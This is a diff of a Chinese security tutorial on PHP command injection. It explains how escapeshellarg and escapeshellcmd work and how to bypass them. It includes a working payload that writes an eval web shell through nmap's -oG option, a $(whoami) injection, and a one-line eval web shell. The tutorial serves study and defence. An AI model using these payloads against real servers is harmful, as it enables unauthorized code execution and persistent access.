@@ -477,8 +477,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2025-08-01 02:12:56</span>
-            <span class="mobile">2025-08-01 02:12:56</span>
+            <span class="desktop">2025-08-02 01:51:12</span>
+            <span class="mobile">2025-08-02 01:51:12</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -526,12 +526,12 @@
     
     
         <span class="article-wordcount article-meta-item">
-            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>29.2k Words</span>
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>31.5k Words</span>
         </span>
     
     
         <span class="article-min2read article-meta-item">
-            <i class="fa-regular fa-clock"></i>&nbsp;<span>118 Mins</span>
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>127 Mins</span>
         </span>
     
     
@@ -1946,10 +1946,23 @@
 </ul>
 <p>也就是说，<code>escapeshellarg()</code> 在处理用户输入时会做两件事：</p>
 <ol>
-<li><strong>将原始字符串中的单引号进行转义</strong>，方法是先关闭当前单引号，插入转义后的单引号，再重新开启单引号，例如：<code>&#39;</code> → <code>\&#39;</code></li>
-<li><strong>在整个字符串外层添加一对单引号</strong>，使其在 shell 中作为一个整体参数传入。</li>
+<li><strong>将原始字符串中的单引号进行转义</strong>，方法是先关闭当前单引号字符串，插入一个单引号字符（通过 <code>&#39;\&#39;&#39;</code> 的方式实现），然后重新开启单引号字符串。也就是说每个 <code>&#39;</code> 会被转换为 <code>&#39;\&#39;&#39;</code>。</li>
+<li><strong>在整个字符串外层添加一对单引号</strong>，使其在 shell 中作为一个完整的、不可拆解的参数传入，避免被当成命令的一部分解析。</li>
 </ol>
-<p>在 Bash 中，<strong>单引号</strong>包裹的内容会被<strong>原样保留</strong>，即其中的变量名不会被解析为实际的变量值；而如果使用<strong>双引号</strong>包裹，Bash 会对变量名进行替换，使用其对应的值。</p>
+<p>在 Linux shell 中，有三种包裹字符串的方式：</p>
+<ul>
+<li><strong>单引号（<code>&#39;...&#39;</code>）</strong> ：<strong>完全原样</strong>，里面所有字符不解释，除了不能出现单引号 <code>&#39;</code> 本身。</li>
+<li><strong>双引号（<code>&quot;...&quot;</code>）</strong> ：变量会被展开（解析 <code>$VAR</code>、<code>\n</code> 等），但<strong>字符串整体作为一个参数传递</strong>，不会因为空格被拆分。</li>
+<li><strong>无引号</strong> ：变量会被展开，但<strong>结果会被再次拆分成多个参数、并进行通配符扩展（*、?）等操作。</strong></li>
+</ul>
+<p>由于单引号的“原样输出”特性，<code>escapeshellarg()</code> 选择用单引号将整个字符串包裹起来，确保用户输入被完全保留、不会被 shell 解释或拆解。</p>
+<p>然而在 shell（比如 bash）中，<strong>单引号字符串 <code>&#39;...&#39;</code> 中不能出现单引号</strong>，因为这样内部的单引号会与外层的单引号闭合，导致逃逸或者语法错误。而由于 shell 在词法层面上并不支持在单引号包裹的字符串中进行字符级的转义处理，因此我们不能使用 <code>\&#39;</code> 转义单引号内部字符串中出现的单引号。</p>
+<p><code>escapeshellarg</code> 函数的做法是在 <code>\&#39;</code> 外层又包裹一层单引号形成了 <code>&#39;\&#39;&#39;</code> 结构。这使得 <code>&#39;\&#39;&#39;</code> 两边的引号跟字面量最外层包裹的单引号闭合了，也就是说 <code>\&#39;</code> 不在字面量的范围内。然而</p>
+<ul>
+<li>shell 在不是字面量的情况下是以空格为分隔进行参数拆分，显然 <code>\&#39;</code> 中没有空格。</li>
+<li>shell 在不是字面量的情况下会变量会被展开，即解析解析参数 和转义字符，显然这里只是将 <code>\&#39;</code> 转义成普通字符。</li>
+</ul>
+<p>因此 <strong><code>&#39; → &#39;\&#39;&#39;</code> 这种转换使得 <code>&#39;</code> 相当于在 <code>&#39;...&#39;</code> 就是一个普通的字面量</strong>，同时保证了 <code>escapeshellarg</code> 的转义结果的语法的正确性。</p>
 <p>因此，<code>escapeshellarg()</code> 的这种处理策略可以在拼接命令参数时有效防止命令注入，确保用户输入不会被解释为 shell 控制语法或其他命令结构。</p>
 <h4 id="escapeshellcmd"><a href="#escapeshellcmd" class="headerlink" title="escapeshellcmd"></a>escapeshellcmd</h4><p><code>escapeshellcmd()</code> 函数用于<strong>转义 shell 命令字符串中的元字符（metacharacters）</strong>，防止恶意注入多条命令。适用于<strong>整个命令字符串</strong>的保护，确保不会被执行额外命令。</p>
 <div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escapeshellcmd</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$command</span></span>): <span class="title">string</span> </span>&#123;&#125;</span><br></pre></td></tr></table></figure></div>
@@ -1966,6 +1979,22 @@
 </ul>
 </li>
 </ul>
+
+  <div class="note-large red">
+    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
+      <p>注意</p>
+
+    </div>
+    <div class="notel-content markdown-body">
+      <p>在类 Unix 系统中，下面这些字符前会被<strong>添加反斜杠</strong>（<code>\</code>）进行转义：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#;`|*?~&lt;&gt;^()[]&#123;&#125;$\, \x0A\xFF</span><br></pre></td></tr></table></figure></div>
+
+<p>其中 <code>&#39;</code>（单引号）和 <code>&quot;</code>（双引号）<strong>仅在它们未成对时</strong>才会被转义。</p>
+<p>在 Windows 系统中，上述所有字符 <strong>以及</strong> <code>%</code> 和 <code>!</code> 会被前缀一个插入符号（<code>^</code>）来转义。</p>
+
+    </div>
+  </div>
+
 <h3 id="命令注入绕过"><a href="#命令注入绕过" class="headerlink" title="命令注入绕过"></a>命令注入绕过</h3><h4 id="程序参数绕过（escapeshellarg）"><a href="#程序参数绕过（escapeshellarg）" class="headerlink" title="程序参数绕过（escapeshellarg）"></a>程序参数绕过（escapeshellarg）</h4><p>例如 gitlist 0.6.0 的下面这段代码存在参数注入漏洞：</p>
 <div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$query</span>);</span><br><span class="line"><span class="variable">$results</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getClient</span>()-&gt;<span class="title function_ invoke__">run</span>(<span class="variable">$this</span>, <span class="string">&quot;grep -i --line-number <span class="subst">&#123;$query&#125;</span> <span class="subst">$branch</span>&quot;</span>);</span><br></pre></td></tr></table></figure></div>
 
@@ -1981,6 +2010,20 @@
 
 <p>也就是说 <code>&#39;--open-files-in-pager=id;&#39;</code> <strong>只是告诉 shell：我这里是一个完整参数，不要因为有空格或特殊字符拆成多段了</strong>。但 shell 最终会把 <code>&#39;--open-files-in-pager=id;&#39;</code> 里的内容原封不动传给程序作为字符串参数，<strong>而不是带着引号一起传过去。</strong></p>
 <p>而 <code>--open-files-in-pager</code> 参数 <code>grep</code> 的一个可以执行命令的参数，因此就造成了任意命令执行。</p>
+
+  <div class="note-large blue">
+    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
+      <p>提示</p>
+
+    </div>
+    <div class="notel-content markdown-body">
+      <p>收集常见命令的危险参数的网站：</p>
+<p>Linux：<a class="link"   target="_blank" rel="noopener" href="https://gtfobins.github.io/" >https://gtfobins.github.io/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p>Windows：<a class="link"   target="_blank" rel="noopener" href="https://gtfobins.github.io/" >https://gtfobins.github.io/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+
+    </div>
+  </div>
+
 <h4 id="双引号逃逸（escapeshellarg）"><a href="#双引号逃逸（escapeshellarg）" class="headerlink" title="双引号逃逸（escapeshellarg）"></a>双引号逃逸（escapeshellarg）</h4><p><code>escapeshellarg</code> 将我们可控的命令字段放入单引号中，使其作为一个字符串整体，不会被 shell 语法解析。</p>
 <p>然而如果我们将 <code>escapeshellarg</code> 转义过的命令<strong>拼接到一条命令的双引号内</strong>，那么依然会导致命令注入。</p>
 <p>这是因为当参数被拼接进双引号中时，<strong>整个双引号内的内容会被当作一个整体传给 shell</strong>，其中即便包含了由 <code>escapeshellarg()</code> 添加的单引号，shell 仍会解析双引号内的内容，从而导致原本的转义效果失效。</p>
@@ -1988,7 +2031,113 @@
 <div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line"><span class="variable">$arg</span> = <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$ip</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&quot;ping -c 1 \&quot;<span class="subst">$arg</span>\&quot;&quot;</span>;  <span class="comment">// ⚠️ 将 escapeshellarg() 的结果又包进了双引号</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br></pre></td></tr></table></figure></div>
 
 <p>参数 <code>ip</code> 在经过 <code>escapeshellarg</code> 转义之后又拼接到双引号之内，因此我们可以随便命令注入，例如 <code>$(whoami)</code>。</p>
-<h4 id="过滤函数混用"><a href="#过滤函数混用" class="headerlink" title="过滤函数混用"></a>过滤函数混用</h4><p>由于 <code>escapeshellarg()</code> 和 <code>escapeshellcmd()</code> 函数的处理机制不同，混用容易造成二次转义混乱。</p>
+<h4 id="过滤函数混用"><a href="#过滤函数混用" class="headerlink" title="过滤函数混用"></a>过滤函数混用</h4><p>由于 <code>escapeshellarg()</code> 和 <code>escapeshellcmd()</code> 函数的处理机制不同，混用容易造成二次转义混乱，这是因为 <code>escapeshellarg</code> 和 <code>escapeshellcmd</code> 处理逻辑不同，并且处理的字符是有冲突的：</p>
+<ul>
+<li><code>escapeshellarg</code> 是针对程序的参数的，它的作用是将字符串外面包裹一层单引号，并将 <code>&#39;</code> 转义成 <code>&#39;\&#39;&#39;</code>。</li>
+<li><code>escapeshellcmd</code> 是针对整条命令的，它的作用是将一些会被 shell 解释的字符进行转义，其中就涉及到了 <code>escapeshellarg</code> 所处理的 <code>&#39;</code> 和 <code>\</code>。</li>
+</ul>
+<p>另外 <code>escapeshellcmd</code> 在转义 <code>&#39;</code> 时有语法上的判断，即仅在单引号未成对存在的时候才会转义。因此如果我们将用户输入的命令先用 <code>escapeshellarg</code> 处理然后再用 <code>escapeshellcmd</code> 处理，这就导致了：</p>
+<ul>
+<li>原本经过 <code>escapeshellarg</code> 处理后原本命令中的所有单引号都被正常转义（<code>\&#39;</code>），并且后续添加的所有单引号在语法上都是闭合的。</li>
+<li><code>escapeshellarg</code> 添加的转义符 <code>\</code> 会被 <code>escapeshellcmd</code> 当做危险字符转义成 <code>\\</code>，导致 <code>escapeshellarg</code> 对单引号的转义失效了（<code>&#39;</code> → <code>&#39;\&#39;&#39;</code> → <code>&#39;\\&#39;&#39;</code>）。</li>
+<li>由于 <code>escapeshellcmd</code> 在转义 <code>&#39;</code> 时有语法上的判断，即仅在单引号未成对存在的时候才会转义。而此时前面 <code>escapeshellarg</code> 转义的单引号失效了，因此单引号闭合错误，最终导致了命令注入。</li>
+</ul>
+
+  <div class="note-large blue">
+    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
+      <p>提示</p>
+
+    </div>
+    <div class="notel-content markdown-body">
+      <p>如果把过滤函数调用顺序反过来，即先调用 <code>escapeshellcmd</code> 再调用 <code>escapeshellarg</code>，那么无论 <code>escapeshellcmd</code> 函数做了哪些处理，<code>escapeshellarg</code> 总会将传递过来的结果“封印”在单引号中，因此这样写至少在安全层面上是完备的。</p>
+
+    </div>
+  </div>
+
+<p>假设输入的内容中间有一个单引号（<code>...&#39;...</code>）则：</p>
+<ol>
+<li><p>经过 <code>escapeshellarg</code> 后会变成 <code>&#39;...&#39;\&#39;&#39;...&#39;</code>。</p>
+</li>
+<li><p>经过 <code>escapeshellcmd</code> 时：</p>
+<ol>
+<li><p>先转义不需要考虑语法的字符 <code>\</code>，此时会变成 <code>&#39;...&#39;\\&#39;&#39;...&#39;</code>。</p>
+</li>
+<li><p>分析单引号的闭合情况，由于 <code>\</code> 被转义，现在是 5 个单引号，因此最后一个单引号不闭合：<font face="JetBrains Mono"><font style="color: rgb(255, 0, 0);">‘…’</font>\\<font style="color: rgb(0, 0, 255);">‘’</font>…<font style="color: rgb(0, 255, 0);">‘</font></font></p>
+</li>
+<li><p>将不闭合的单引号转义：<code>&#39;...&#39;\\&#39;&#39;...&#39;</code> →  <code>&#39;...&#39;\\&#39;&#39;...\&#39;</code>，此时 <font face="JetBrains Mono">‘…’\\‘’<font style="color: rgb(255, 0, 0);">…\‘</font></font> 右边那段没有被引号包裹，可以逃逸出来成为一个独立的参数。</p>
+</li>
+</ol>
+</li>
+</ol>
+<p>所以我们可以总结出一个规律，那就是在依次经过 <code>escapeshellarg</code> 和 <code>escapeshellcmd</code> 转换后，字符串中出现的单引号 <code>&#39;</code> 会变成 <code>&#39;\\&#39;&#39;</code>。仅考虑单引号闭合的话，相当于：</p>
+<ol>
+<li>整个字符串中出现的 1 个单引号全部变成 3 个单引号。</li>
+<li>字符串首尾各添加一个单引号。</li>
+<li>从头到尾单引号两两配对，最后如果多出来一个单引号则将其转义。</li>
+</ol>
+<p>由于<strong>头到尾单引号两两配对</strong>，因此<strong>单引号模式</strong>和<strong>无引号模式</strong>交替出现。我们只需要将要逃逸的命令放在<strong>无引号模式</strong>的范围并且<strong>左右添加空格截断</strong>就行。</p>
+<p>例如这段代码：</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$host</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line"><span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$host</span>);</span><br><span class="line"><span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$host</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span> . <span class="variable">$host</span>);</span><br></pre></td></tr></table></figure></div>
+
+<p>显然我们可以通过 <code>nmap</code> 的 <code>-oG</code> 参数写一句话木马实现 RCE。</p>
+<blockquote>
+<p> <code>nmap</code> 的 <code>-oG</code> 参数表示将扫描结果保存为一种适合 <code>grep</code> 等命令行工具处理的“机器友好”格式，写入你指定的文件中（如 <code>-oG result.txt</code>）。</p>
+</blockquote>
+<p>为此我们可以构造下面这段 payload：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&lt;?php @eval($_POST[&quot;a&quot;]);?&gt; -oG 1.php &#x27;</span><br></pre></td></tr></table></figure></div>
+
+<p>因为前后各 1 个单引号在转换后各变成 3 个单引号，成功与最外层的单引号闭合导致，因此中间这段 <code>&lt;?php @eval($_POST[&quot;a&quot;]);?&gt; -oG 1.php </code> 逃逸出来。再加上 <code>-oG 1.php</code> 周围的空格截断，我们可以成功注入一个 <code>-oG</code> 命令写文件。</p>
+<p>具体的转换过程为：</p>
+<ol>
+<li><p>经过 <code>escapeshellarg</code> 转换后变成了下面这个形式。数据整体按照单引号分成了 3 个区域，中间隔着 2 个转义的单引号。</p>
+<p><font face="JetBrains Mono"><font style="color: rgb(0, 204, 0);">‘’</font>\‘<font style="color: rgb(255, 0, 0);">‘&lt;?php @eval(&#36;_POST[“a”]);?&gt; -oG 1.php ‘</font>\‘<font style="color: rgb(0, 0, 255);">‘’</font></font></p>
+</li>
+<li><p><code>escapeshellcmd</code> 将上述数据整体进行敏感字符转义。</p>
+<p><font face="JetBrains Mono">‘’<font style="color: rgb(204, 0, 204);">\\</font>‘’<font style="color: rgb(204, 0, 204);">\&lt;\?</font>php @eval<font style="color: rgb(204, 0, 204);">\(\&#36;</font>_POST<font style="color: rgb(204, 0, 204);">\[</font>“a”<font style="color: rgb(204, 0, 204);">\]\)\;\?\&gt;</font> -oG 1.php ‘<font style="color: rgb(204, 0, 204);">\\</font>‘’’</font></p>
+<p>由于转义后单引号的数量为偶数，因此全部满足闭合条件，后续不会转义单引号。此时中间红色部分的内容已经从单引号中逃逸出来，不受约束。</p>
+<p><font face="JetBrains Mono">‘’\\‘’<font style="color: rgb(255, 0, 0);">\&lt;\?php @eval\(\&#36;_POST\[“a”\]\)\;\?\&gt; -oG 1.php </font>‘\\‘’’</font></p>
+<p>尤其是最后的 <code>-oG 1.php</code> 由于前面被空格分隔，因此单独形成一个参数，实现文件写入。</p>
+</li>
+<li><p>最终转以后的命令与 <code>nmap</code> 命令拼接形成下面这条命令：</p>
+<p><font face="JetBrains Mono">nmap -T5 -sT -Pn –host-timeout 2 -F <font style="color: rgb(204, 0, 204);">‘’\\‘’\&lt;\?php</font> <font style="color: rgb(255, 128, 0);">@eval\(\&#36;_POST\[“a”\]\)\;\?\&gt;</font> <font style="color: rgb(255, 0, 0);">-oG 1.php</font> <font style="color: rgb(0, 0, 255);">‘\\‘’’</font></font></p>
+<p>可以看到我们传入的 <code>host</code> 参数通过空格分隔形成了 <code>nmap</code> 的 4 个参数。除去最后一个无效参数 <code>&#39;\\&#39;&#39;&#39;</code> 外，前面两个参数的含义分别为：</p>
+<ul>
+<li><code>&#39;&#39;\\&#39;&#39;\&lt;\?php</code>，<code>@eval\(\$_POST\[&quot;a&quot;\]\)\;\?\&gt;</code>，<code>&#39;\\&#39;&#39;&#39;</code>：<code>nmap</code> 需要扫描的 3 个目标 ip</li>
+<li><code>-oG 1.php</code>：将扫描结果写到 <code>1.php</code> 中</li>
+</ul>
+</li>
+<li><p>执行拼接后的 <code>nmap</code> 命令，其中参数传递情况如下：</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(<span class="string">&quot;/usr/bin/nmap&quot;</span>, [<span class="string">&quot;nmap&quot;</span>, <span class="string">&quot;-T5&quot;</span>, <span class="string">&quot;-sT&quot;</span>, <span class="string">&quot;-Pn&quot;</span>, <span class="string">&quot;--host-timeout&quot;</span>, <span class="string">&quot;2&quot;</span>, <span class="string">&quot;-F&quot;</span>, <span class="string">&quot;\\&lt;?php&quot;</span>, <span class="string">&quot;@eval($_POST[a]);?&gt;&quot;</span>, <span class="string">&quot;-oG&quot;</span>, <span class="string">&quot;1.php&quot;</span>, <span class="string">&quot;\\\\&quot;</span>], <span class="number">0x7ffffa9a8218</span> <span class="comment">/* 20 vars */</span>) = <span class="number">0</span></span><br></pre></td></tr></table></figure></div>
+
+<p>我们发现前面传递的参数中的 <code>\</code> 都消失了。这是因为 POSIX shell 在无引号时解释命令中反斜杠的规则为：</p>
+<ul>
+<li><code>\</code> <strong>转义</strong>紧随其后的<strong>一个</strong>字符（换行符除外）：<ul>
+<li>若是<strong>特殊字符</strong>（空格,<code>$</code>,<code>`</code>, <code>&quot;</code>, <code>&#39;</code>, <code>\</code>, <code>*</code>, <code>?</code>, <code>[</code>, <code>]</code>, <code>(</code>, <code>)</code>, <code>|</code>, <code>&amp;</code>, <code>;</code>, <code>&lt;</code>, <code>&gt;</code> 等），则去掉它的特殊意义：<ul>
+<li>例：<code>echo a\ b</code> → <code>a b</code>（空格被保留为普通字符）</li>
+<li>例：<code>echo \$HOME</code> → 输出字面 <code>$HOME</code></li>
+<li>例：<code>echo \\</code> → <code>\</code>（后一个 <code>\</code> 被保留为普通字符）</li>
+</ul>
+</li>
+<li>若是<strong>普通字符</strong>（如 <code>n</code>、<code>x</code>），<code>\</code> 被移除，字符原样保留：<ul>
+<li>例：<code>echo \n</code> → 实参是 <code>n</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>反斜杠 + 换行</strong>（<code>\</code> 后紧跟真实的换行）会被<strong>整体删除</strong>，形成<strong>行连接</strong>：</li>
+</ul>
+<p>因此传参内容会被 shell 转换，去掉一些不在引号内的 <code>\</code>：</p>
+<ul>
+<li><code>&#39;&#39;\\&#39;&#39;\&lt;\?php</code> → <code>\&lt;?php</code></li>
+<li><code>@eval\(\$_POST\[“a”\]\)\;\?\&gt;</code> → <code>@eval($_POST[a]);?&gt;</code>（未转义的双引号没有被当做参数传入）</li>
+<li><code>&#39;\\&#39;&#39;&#39;</code> → <code>\\</code></li>
+</ul>
+<p><code>nmap</code> 在运行时会扫描这三个 ip，输出如下：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Warning: Nmap may not work correctly on Windows Subsystem for Linux.</span><br><span class="line">For best performance and accuracy, use the native Windows build from https://nmap.org/download.html#windows.</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2025-08-02 01:45 CST</span><br><span class="line">Failed to resolve &quot;\&lt;?php&quot;.</span><br><span class="line">Failed to resolve &quot;@eval($_POST[a]);?&gt;&quot;.</span><br><span class="line">Failed to resolve &quot;\\&quot;.</span><br><span class="line">WARNING: No targets were specified, so 0 hosts scanned.</span><br><span class="line">Nmap done: 0 IP addresses (0 hosts up) scanned in 0.03 seconds</span><br><span class="line">Nmap done: 0 IP addresses (0 hosts up) scanned in 0.03 seconds</span><br></pre></td></tr></table></figure></div>
+
+<p>而扫描结果会写入 <code>1.php</code> 中，内容如下。可以看到一句话木马被成功写入。</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.80 scan initiated Sat Aug  2 01:41:19 2025 as: nmap -T5 -sT -Pn --host-timeout 2 -F -oG 1.php \\&lt;?php @eval($_POST[a]);?&gt; \\\\</span></span><br><span class="line"><span class="comment"># Nmap done at Sat Aug  2 01:41:19 2025 -- 0 IP addresses (0 hosts up) scanned in 0.15 seconds</span></span><br></pre></td></tr></table></figure></div></li>
+</ol>
 <h2 id="PHP-代码执行函数"><a href="#PHP-代码执行函数" class="headerlink" title="PHP 代码执行函数"></a>PHP 代码执行函数</h2><h3 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h3><p><code>eval()</code> 是一个 <strong>语言结构（language construct）</strong>，用于在运行时<strong>动态执行 PHP 代码字符串</strong>。它可以修改作用域中的变量，并可通过 <code>return</code> 返回值。但由于极易被用于执行恶意代码，因此<strong>强烈建议谨慎使用</strong>。</p>
 <blockquote>
 <p><strong>语言结构（language construct）</strong> 是指：在 PHP 中属于<strong>语言本身内置的关键语法元素</strong>，而<strong>不是一个普通的函数</strong>。</p>
@@ -2054,9 +2203,12 @@
 <p>  简而言之：<code>eval()</code> 并不会将代码“真正嵌入”到当前位置，而是作为<strong>一个独立的代码块</strong>在当前上下文中执行。</p>
 </li>
 <li><p>在利用 <code>eval</code> 写一句话木马的时候，可以成如下形式：</p>
-  <div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br></pre></td></tr></table></figure></div>
+  <div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br></pre></td></tr></table></figure></div>
 
-<p>  其中 <strong><code>@</code> 是一个错误控制操作符（error control operator）</strong>，它并不是 PHPStorm 的特性，而是 PHP 语言本身的语法，用于<strong>抑制某一行表达式执行时产生的错误或警告信息</strong>。这里使用错误抑制符是为了隐藏没有传参导致的 Notice 错误。</p>
+<ul>
+<li>其中 <strong><code>@</code> 是一个错误控制操作符（error control operator）</strong>，它并不是 PHPStorm 的特性，而是 PHP 语言本身的语法，用于<strong>抑制某一行表达式执行时产生的错误或警告信息</strong>。这里使用错误抑制符是为了隐藏没有传参导致的 Notice 错误。</li>
+<li>在一些情景下由于引号转义或过滤无法写成 <code>&#39;a&#39;</code> 的形式，我们可以省略引号。</li>
+</ul>
 </li>
 </ul>
 
@@ -3043,7 +3195,7 @@
         
             <li>
                 <strong>Updated at
-                    :</strong> 2025-08-01 02:12:56
+                    :</strong> 2025-08-02 01:51:12
             </li>
         
         <li>
@@ -3203,7 +3355,7 @@
                     </span>
                     
                         <span>
-                            706.2k words in total
+                            709.3k words in total
                         </span>
                     
                 </p>
